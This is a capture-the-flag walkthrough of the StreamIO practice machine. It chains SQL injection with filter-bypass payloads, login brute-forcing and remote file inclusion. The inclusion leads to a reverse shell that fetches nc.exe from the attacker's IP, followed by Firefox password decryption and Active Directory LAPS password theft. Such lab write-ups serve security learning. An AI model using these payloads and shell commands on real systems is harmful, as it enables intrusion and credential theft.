# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

nmap -p 53,80,88,135,139,389,445,443,464,593,636,3268,3269,5985,9389,49667,49678,49677,49708,54187 -sC -sV $IP
```

### Directory Brute Force
not working without `-k`
```bash
Could not connect to https://streamio.htb due to SSL errors (run with -k to ignore)

feroxbuster -u https://streamio.htb -k
feroxbuster -u https://streamio.htb/admin/ -k -x php

301      GET        2l       10w      150c https://streamio.htb/Admin => https://streamio.htb/Admin/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
```

# Shell as yoshihide
### SQL injection
* https://watch.streamio.htb/search.php

```sql
Using `null` or `order` will be blocked * https://sandunigfdo.medium.com/sql-injection-union-attack-finding-a-column-containing-text-179949e100b2
Malicious Activity detected!! Session Blocked for 5 minutes 
' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3,4,5,6 fRoM information_schema.schemata--

abcd' union select 1,2,3,4,5,6-- 
abcd' union select 'a',1,2,3,4,5--
abcd' union select 1,'a',2,3,4,5--
abcd' union select 1,@@version,3,4,5,6;-- 

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor) 

abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- 

master
model
msdb
STREAMIO  <- 10' union select 1,(select DB_NAME()),3,4,5,6--
streamio_backup
tempdb
```

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-databases
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-union-based
* https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

```sql
abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- 
abcd' union select 1,name,3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U';-- 
abcd' union select 1,STRING_AGG(name, ', '),3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U';-- 

movies
users

abcd' union select 1,name,3,4,5,6 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');-- 

username
password

abcd' union select 1, concat(username,':',password) ,3,4,5,6 from users--

Got the crackedpass.txt
```

### Brute force the web
* https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#check-passwords

```bash
cat crackedpass.txt | cut -d: -f1 > user
cat crackedpass.txt | cut -d: -f3 > pass
cat crackedpass.txt | cut -d: -f1,3 > userpass

crackmapexec smb $IP -u user -p pass --no-bruteforce --continue-on-success
SMB         10.129.63.50    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) 
SMB         10.129.63.50    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
```

I’ll use the `https-post-form` plugin, which takes a string formatted as `[page to post to]:[post body]:F=[string that indicates failed login]`. It finds one that works:

```bash
hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
# Both works fine
hydra -L user -P pass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
```

### Fuzz web admin parameters
Both wfuzz and ffuf works fine

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=5b81mitco4j6hgiljr9euhqj1c -fs 1678

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 245ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 256ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 244ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 244ms]
```

* https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-cookies
* https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz

```bash
Fuzzing Custom headers
wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -H "Cookie: PHPSESSID=5b81mitco4j6hgiljr9euhqj1c" --hh 1678

Fuzzing Cookies
wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -b "PHPSESSID=5b81mitco4j6hgiljr9euhqj1c" --hh 1678
```

### Using the debug param
`https://streamio.htb/admin/?debug=index.php` -> this option is for developers only ---- ERROR ----
`https://streamio.htb/admin/?debug=master.php` working

### PHP filter
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter

* php://filter/convert.base64-encode|convert.base64-decode/resource=master.php
* php://filter/convert.base64-encode/resource=master.php

```bash
echo "onlyPGg<SNIP>9DQo/Pg==" | base64 -d > master.php <- Beautified
```

```php
<?php
if (isset($_GET["debug"])) {
    echo "this option is for developers only";
    if ($_GET["debug"] === "index.php") {
        die(" ---- ERROR ----");
    } else {
        include $_GET["debug"]; <- Use it to do RFI
    }
} elseif (isset($_GET["user"])) {
    require "user_inc.php";
} elseif (isset($_GET["staff"])) {
    require "staff_inc.php";
} elseif (isset($_GET["movie"])) {
    require "movie_inc.php";
}
?>
```

### RCEish
The `Content-Type: application/x-www-form-urlencoded` not been added by Firefox by default. By Burp do it automatically.

##### Other 3 things
1. 

```bash burp
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=5b81mitco4j6hgiljr9euhqj1c
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

include=http://10.10.16.12/cmd.php <- you can't do a ?cmd=.. here. Since it's not really RCE but to feed the `eval`
``` 

2. To feed the `eval` you can't use `<?php ?>` tag anymore but plain php code. And the server side might have cache you need to keep chaning the file name to gain more stablitiy. `cmd.php` -> `cmd02.php`

3. The popular shell doesn't work
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.63.50] 60254
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

### Explolit
 Only `curl` and `powershell -c` worked after checking the version
```php
system("curl --version");
system("wget --version");
system("powershell --version");
system("powershell Get-Host");

system("powershell -c wget http://10.10.16.12/nc.exe -outfile c:\\windows\\temp\\nc.exe")
system("curl 10.10.16.12/nc64.exe -o c:\\windows\\temp\\nc64.exe");

system("c:\windows\\temp\\nc.exe 10.10.16.12 443 -e powershell");
```

```cmd
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.63.50] 51820
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
```

# Shell as nikk37
### Enum
```cmd
PS C:\inetpub\watch.streamio.htb> type search.php
type search.php
<?php
$search = strtolower($_POST['q']);

// sqlmap choker
$shitwords = ["/WAITFOR/i", "/vkBQ/i", "/CHARINDEX/i", "/ALL/i", "/SQUARE/i", "/ORDER/i", "/IF/i","/DELAY/i", "/NULL/i", "/UNICODE/i","/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "ifnull/i", "/ or /i"];
foreach ($shitwords as $shitword) {
        if (preg_match( $shitword, $search )) {
                header("Location: https://watch.streamio.htb/blocked.php");
                die("blocked");
        }
}


# Query section
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');

dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

##### streamio_backup DB
```cmd
PS C:\inetpub\streamio.htb> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
PS C:\inetpub\streamio.htb> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           
// Alternatively
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

Get data
```cmd
PS C:\inetpub\streamio.htb\admin> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
```

```txt
nikk37 get_dem_girls2@yahoo.com
Lauren ##123a8j8w5123##
Sabrina !!sabrina$
```

```cmd
PS C:\inetpub\streamio.htb\admin> net user nikk37
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:57:16 AM
Password expires             Never
Password changeable          2/23/2022 1:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 2:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
```

```bash
# crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         watch.streamIO.htb 5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        watch.streamIO.htb 5985   DC               [*] http://watch.streamIO.htb:5985/wsman
WINRM       watch.streamIO.htb 5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

# Auth as JDgodd
### Enum 
WinPEAS notice that there is a FireFox database file which may contain some credentials. Researching how to
decrypt FireFox database passwords from `key4.db`

* https://github.com/A1vinSmith/firepwd
* https://0xdf.gitlab.io/2022/03/05/htb-hancliffe.html#decrypt-passwords
* https://raw.githubusercontent.com/lclevy/firepwd/master/mozilla_pbe.pdf

```cmd
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
                                        
Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json
```

```bash
python3 ~/Tools/firepwd/firepwd.py -d Firefox
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

crackmapexec winrm streamio.htb -u JDgodd -p 'password@12'

crackmapexec smb streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r
SMB         watch.streamIO.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         watch.streamIO.htb 445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

### Bloodhound
```bash
bloodhound-python -c all -d streamio.htb -dc streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --zip -ns $IP
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 01M 13S
INFO: Compressing output into 20231201164155_bloodhound.zip

sudo neo4j console
```

JDgodd -> Node Info -> OUTBOUND OBJECT CONTROL -> First Degree Object Control

Clicking that “1” shows that JDgodd has ownership and WriteOwner on the Core Staff group.

Expanding out from Core Staff and setup the DC.STREAMIO.HTB as ending node while the JDgodd as statintg node, it has ReadLAPSPassword on the DC computer object:

##### Add JDgodd to the CORE STAFF group
```cmd
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PowerView.ps1                 
Info: Upload successful

*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('STREAMIO.HTB\JDGODD', $SecPassword)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity "JDGODD"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDGODD' -Credential $Cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-DomainGroupMember -Identity 'CORE STAFF'

GroupDomain             : streamIO.htb
GroupName               : CORE STAFF
GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
MemberDomain            : streamIO.htb
MemberName              : JDgodd
MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
MemberObjectClass       : user
MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104

*Evil-WinRM* PS C:\Users\nikk37\Documents> net user jdgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:56:42 AM
Password expires             Never
Password changeable          2/23/2022 1:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/1/2023 7:09:33 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

##### Read LAPS Password with 3 different ways
1. cme
2. ldapsearch
3. pyLAPS.py

```bash
crackmapexec smb streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --laps --ntds
SMB         watch.streamIO.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         watch.streamIO.htb 445    DC               [-] DC\administrator:@[C21{#FZVH,n! STATUS_LOGON_FAILURE

ldapsearch -x -H ldap://$IP -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd | grep ms-MCS-AdmPwd -n5
1-# extended LDIF
2-#
3-# LDAPv3
4-# base <DC=streamIO,DC=htb> with scope subtree
5:# filter: (ms-MCS-AdmPwd=*)
6:# requesting: ms-MCS-AdmPwd 
7-#
8-
9-# DC, Domain Controllers, streamIO.htb
10-dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
11-ms-Mcs-AdmPwd: @[C21{#FZVH,n!

python pyLAPS.py --action get -u 'JDgodd' -d 'streamio.htb' -p 'JDg0dd1s@d0p3cr3@t0r' --dc-ip $IP
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC$                  : @[C21{#FZVH,n!

evil-winrm -i $IP -u administrator -p '@[C21{#FZVH,n!'
  ```
